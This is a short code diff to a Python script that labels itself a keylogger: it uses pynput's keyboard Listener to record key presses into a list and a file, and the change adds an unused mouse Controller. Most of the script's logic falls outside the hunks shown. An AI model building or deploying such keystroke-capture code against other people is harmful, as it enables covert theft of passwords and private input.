@@ -1,9 +1,12 @@
 import pynput
 from pynput.keyboard import Key, Listener
+from pynput.mouse import Button, Controller
 
 
 count = 0
 keys = []
+
+mouse = Controller()
 
 
 def write_file(keys):
@@ -36,5 +39,6 @@ def on_release(key):
 
 
 print("[*] Keylogger active. Press ESC to stop...")
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
